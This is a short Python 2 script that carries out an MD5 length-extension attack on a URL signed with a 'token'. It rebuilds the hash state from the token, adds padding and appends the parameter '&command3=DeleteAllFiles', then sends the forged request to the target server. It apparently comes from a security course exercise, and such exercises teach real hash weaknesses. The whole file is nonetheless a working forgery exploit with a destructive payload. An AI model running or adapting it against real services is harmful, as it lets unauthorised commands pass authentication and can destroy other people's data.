from pymd5 import md5, padding

import httplib, urlparse, sys
import urllib

url = sys.argv[1]
parsedUrl = urlparse.urlparse(url)
params = {}
for x in parsedUrl.query.split('&'):
    y = x.split('=')
    params.update({ y[0] : y[1] })

originalMessageHash = params['token']
m = parsedUrl.query.replace('token=' + params['token'], '')
if m[0] == '&':
    m = m[1:]
m_len = len(m) + 8

pad = urllib.quote(padding(m_len * 8))
bits = (m_len + len(padding(m_len*8)))*8 

h = md5(state=originalMessageHash.decode('hex'), count=bits)

suffix = '&command3=DeleteAllFiles'
h.update(suffix)

newUrl = '{scheme}://{netloc}{path}?token={token}&{params}{pad}{suffix}'.format(
        scheme=parsedUrl.scheme, netloc=parsedUrl.netloc, path=parsedUrl.path,
        token=h.hexdigest(), params=m, pad=pad, suffix=suffix)

parsedUrl = urlparse.urlparse(newUrl)
print 'URL:', newUrl

conn = httplib.HTTPSConnection(parsedUrl.hostname)
conn.request('GET', parsedUrl.path + '?' + parsedUrl.query)
print conn.getresponse().read()

